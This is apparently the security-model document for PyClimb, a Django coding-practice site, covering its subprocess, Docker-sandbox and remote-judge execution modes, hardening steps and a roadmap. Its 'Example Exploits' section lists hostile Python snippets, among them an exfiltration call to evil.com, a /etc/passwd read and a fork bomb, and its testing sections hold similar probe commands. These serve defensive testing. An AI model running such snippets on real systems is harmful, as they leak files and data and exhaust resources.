# PyClimb Security Model

This document describes the current security posture of PyClimb's code execution system and what changes are required before public deployment.

## Current Status

**⚠️ WARNING: Running untrusted code without a secure execution backend is NOT suitable for public internet use.**

PyClimb can execute code in three modes:
- **Subprocess mode (default for local dev):** basic guardrails, not safe for untrusted users.
- **Docker sandbox mode:** isolated execution designed for production use on hosts with Docker access.
- **Remote judge mode:** signed API calls to an external isolated judge service (recommended for Railway).

In production (`DEBUG=false`), PyClimb **requires** secure execution by default unless you explicitly disable `PYCLIMB_REQUIRE_SANDBOX`.

---

## Current Safeguards

| Safeguard | Implementation | Effectiveness |
|-----------|----------------|---------------|
| **Subprocess isolation** | Code runs in `subprocess.run()`, never `exec()` in Django | ✅ Good |
| **Time limit** | 2-second timeout via `subprocess.run(timeout=...)` | ✅ Good |
| **Output size limit** | stdout/stderr capped at 64KB | ✅ Good |
| **Code size limit** | Submissions capped at 50KB | ✅ Good |
| **Temp directory** | Each execution runs in isolated `tempfile.TemporaryDirectory` | ⚠️ Partial |
| **Minimal environment** | Only `PATH`, `HOME`, `TMPDIR` passed to subprocess | ⚠️ Partial |
| **Python isolated mode** | `-I` flag ignores `PYTHON*` env vars and user site-packages | ⚠️ Partial |
| **No bytecode** | `PYTHONDONTWRITEBYTECODE=1` prevents `.pyc` creation | ✅ Good |
| **Docker sandbox (optional)** | Container-per-submission with strict limits | ✅ Strong (when enabled) |
| **Remote judge (optional)** | Signed request to isolated execution service | ✅ Strong (when properly configured) |

---

## Known Risks (Subprocess Mode)

### 🔴 Critical

| Risk | Description | Mitigation Status |
|------|-------------|-------------------|
| **Filesystem read access** | Code can read any file the Django process can read | ❌ Not mitigated |
| **Filesystem write access** | Code can write outside temp directory | ❌ Not mitigated |
| **Network access** | Code can make outbound network connections | ❌ Not mitigated |
| **Process spawning** | Code can spawn additional processes | ❌ Not mitigated |
| **Resource exhaustion** | Fork bombs, memory exhaustion possible | ⚠️ Partially mitigated by timeout |

### 🟡 Moderate

| Risk | Description | Mitigation Status |
|------|-------------|-------------------|
| **Import abuse** | Code can import any installed Python package | ⚠️ Somewhat limited by `-I` flag |
| **Environment probing** | Code can inspect system via `os`, `sys`, `platform` | ❌ Not mitigated |
| **Timing attacks** | Code can measure execution time to probe system | ❌ Not mitigated |

### Example Exploits (For Awareness)

```python
# Read sensitive files
print(open('/etc/passwd').read())

# Write to filesystem
open('/tmp/evil.txt', 'w').write('pwned')

# Network access
import urllib.request
urllib.request.urlopen('https://evil.com/exfil?data=...')

# Fork bomb (will timeout, but wastes resources)
import os
while True: os.fork()

# Memory exhaustion
x = 'A' * (10 ** 10)
```

---

## Production Requirements

Before deploying PyClimb to the public internet, implement **at least one** of these isolation strategies:

### Option 1: Container-per-Submission (Recommended for Docker-capable hosts)

Run each submission in a disposable Docker container:

```
┌─────────────────────────────────────────────┐
│  Django Server                              │
│  ┌────────────────────────────────────────┐ │
│  │  Judge Service                         │ │
│  │  - Creates container per submission    │ │
│  │  - Mounts code as read-only volume     │ │
│  │  - Captures stdout/stderr              │ │
│  │  - Destroys container after execution  │ │
│  └────────────────────────────────────────┘ │
└─────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────┐
│  Disposable Container                       │
│  - No network (--network none)              │
│  - Read-only filesystem                     │
│  - Memory limit (--memory 128m)             │
│  - CPU limit (--cpus 0.5)                   │
│  - No privileged operations                 │
│  - Dropped capabilities                     │
└─────────────────────────────────────────────┘
```

**Docker run example:**
```bash
docker run --rm \
  --network none \
  --memory 128m \
  --cpus 0.5 \
  --read-only \
  --tmpfs /tmp:size=10m \
  --security-opt no-new-privileges \
  --cap-drop ALL \
  -v /path/to/code.py:/code.py:ro \
  python:3.11-slim \
  timeout 5 python /code.py < /dev/stdin
```

### Option 2: Dedicated Judge Server

Run the judge on a separate, isolated server:

```
┌──────────────┐         ┌──────────────────────┐
│ Django App   │  HTTPS  │ Judge Server         │
│ (Web-facing) │ ──────► │ (No internet egress) │
└──────────────┘         │ (Ephemeral VMs)      │
                         └──────────────────────┘
```

- Judge server has no access to Django database
- Judge server has no outbound internet
- Code runs in ephemeral VMs or containers
- Network isolated via firewall rules

### Option 3: Remote Judge Service (Recommended on Railway)

Use an external judge API that:
- verifies HMAC-signed requests (`X-PyClimb-Timestamp`, `X-PyClimb-Signature`)
- executes code in isolated sandboxes or containers
- enforces CPU/memory/time limits
- returns structured execution output (`stdout`, `stderr`, `exit_code`, `timed_out`)

### Option 4: Firejail/Bubblewrap Sandbox

Use Linux sandboxing tools for lighter-weight isolation:

```bash
firejail --private --net=none --rlimit-as=134217728 \
  python3 solution.py < input.txt
```

Or with bubblewrap:
```bash
bwrap --unshare-net --unshare-pid --die-with-parent \
  --ro-bind /usr /usr --ro-bind /lib /lib \
  --tmpfs /tmp --proc /proc \
  python3 solution.py
```

---

## Implementation Roadmap

### Phase 1: Current (MVP)
- [x] Subprocess execution
- [x] Time limits
- [x] Output limits
- [x] Temp directory isolation
- **Suitable for:** Local development, trusted users only

### Phase 2: Basic Hardening
- [ ] Add memory limits via `resource.setrlimit()` in subprocess
- [ ] Restrict imports via custom import hook
- [ ] Add seccomp filtering (Linux only)
- **Suitable for:** Private deployment with semi-trusted users

### Phase 3: Container Isolation ✅ IMPLEMENTED
- [x] Docker-per-submission execution
- [x] Network isolation (`--network none`)
- [x] Filesystem isolation (`--read-only`)
- [x] Resource limits via Docker (`--memory`, `--cpus`, `--pids-limit`)
- [x] Dropped capabilities (`--cap-drop ALL`)
- [x] No privilege escalation (`--security-opt no-new-privileges`)
- [x] Remote judge integration via signed API requests
- **Suitable for:** Public deployment (when enabled)

### Phase 4: Production Hardening
- [ ] Rate limiting per user/IP
- [ ] Queue system for fair scheduling (Celery/Redis)
- [ ] Monitoring and alerting
- [ ] Abuse detection
- **Suitable for:** Public internet at scale

---

## Secure Execution Backends (Phase 3)

PyClimb includes both:
- a Docker-based local sandbox
- a remote judge integration via signed API requests

### Enabling the Sandbox

1. **Build the sandbox image:**
   ```bash
   cd sandbox
   docker build -t pyclimb-sandbox .
   ```

2. **Enable sandbox mode** via environment variable:
   ```bash
   export PYCLIMB_USE_SANDBOX=true
   ```

   Or in Django settings:
   ```python
   PYCLIMB_USE_SANDBOX = True
   ```

3. **(Production) Require sandboxing** (recommended):
   ```bash
   export PYCLIMB_REQUIRE_SANDBOX=true
   ```
   When `DEBUG=false`, this is enforced by default unless explicitly disabled.

### Sandbox Security Features

| Feature | Implementation | Effect |
|---------|----------------|--------|
| **No network** | `--network none` | Cannot make outbound connections |
| **Memory limit** | `--memory 128m` | OOM-killed if exceeded |
| **CPU limit** | `--cpus 0.5` | Throttled CPU usage |
| **Process limit** | `--pids-limit 50` | Prevents fork bombs |
| **Read-only FS** | `--read-only` | Cannot write to filesystem |
| **Writable /tmp** | `--tmpfs /tmp:size=10m` | Limited temp space |
| **No privileges** | `--security-opt no-new-privileges` | Cannot escalate |
| **No capabilities** | `--cap-drop ALL` | Minimal permissions |
| **Non-root user** | Container runs as `runner` | Limited access |
| **Timeout** | `timeout` command | Killed after time limit |

### Configuration Options

| Variable | Default | Description |
|----------|---------|-------------|
| `PYCLIMB_USE_SANDBOX` | `false` | Enable Docker sandbox |
| `PYCLIMB_REQUIRE_SANDBOX` | `false` | Refuse to run code without sandbox (defaults to true when DEBUG is false) |
| `PYCLIMB_SANDBOX_IMAGE` | `pyclimb-sandbox` | Docker image name |
| `PYCLIMB_SANDBOX_TIMEOUT` | `5` | Execution timeout (seconds) |
| `PYCLIMB_SANDBOX_MEMORY` | `128m` | Memory limit |
| `PYCLIMB_SANDBOX_CPUS` | `0.5` | CPU limit |
| `PYCLIMB_REMOTE_JUDGE_URL` | `` | Remote judge base URL (e.g. `https://judge.example.com`) |
| `PYCLIMB_REMOTE_JUDGE_TOKEN` | `` | Shared secret for HMAC request signing |

### Testing the Sandbox

```bash
# Verify network is blocked
echo 'import urllib.request; urllib.request.urlopen("https://example.com")' | \
  python -c "from submissions.services.sandbox import run_in_sandbox; print(run_in_sandbox(open('/dev/stdin').read(), ''))"
# Should fail with network error

# Verify filesystem is read-only  
echo 'open("/evil.txt", "w").write("pwned")' | \
  python -c "from submissions.services.sandbox import run_in_sandbox; print(run_in_sandbox(open('/dev/stdin').read(), ''))"
# Should fail with read-only filesystem error
```

### Fallback Behavior

The runner selects execution backend in this order:
1. Docker sandbox (if enabled and available)
2. Remote judge (if URL + token are configured)
3. Subprocess fallback (only when secure execution is not required)

If secure execution is required and no secure backend is active, execution is refused.

---

## Testing Security

Before deploying, test these scenarios:

```bash
# Should be blocked in production:
python -c "import os; os.system('whoami')"
python -c "import socket; s=socket.socket(); s.connect(('8.8.8.8', 53))"
python -c "open('/etc/passwd').read()"
python -c "while True: pass"  # Should timeout
python -c "x = 'A' * 10**9"   # Should be killed for memory
```

---

## Incident Response

If you suspect a security breach:

1. **Stop the Django server immediately**
2. **Review recent submissions** for malicious code patterns
3. **Check system logs** for unauthorized access
4. **Rotate any credentials** that may have been exposed
5. **Audit the host** for persistence mechanisms

---

## Summary

| Deployment Scenario | Without Secure Backend | With Secure Backend Enabled |
|---------------------|-----------------|----------------------|
| Local development (just you) | ✅ Acceptable | ✅ Acceptable |
| Private LAN (trusted users) | ⚠️ Risky | ✅ Safe |
| Private internet (friends) | ⚠️ Risky | ✅ Safe |
| Public internet | ❌ Unsafe | ✅ Safe (with Phase 4) |

**Bottom line:** 
- For local development, sandbox mode is optional.
- For any deployment with untrusted users, enable a secure backend:
  - Docker sandbox (`PYCLIMB_USE_SANDBOX=true`), or
  - Remote judge (`PYCLIMB_REMOTE_JUDGE_URL` + `PYCLIMB_REMOTE_JUDGE_TOKEN`)
  and require secure execution (`PYCLIMB_REQUIRE_SANDBOX=true`) to prevent unsandboxed fallback.
- For public internet deployment, also implement Phase 4 (rate limiting, queues, monitoring).
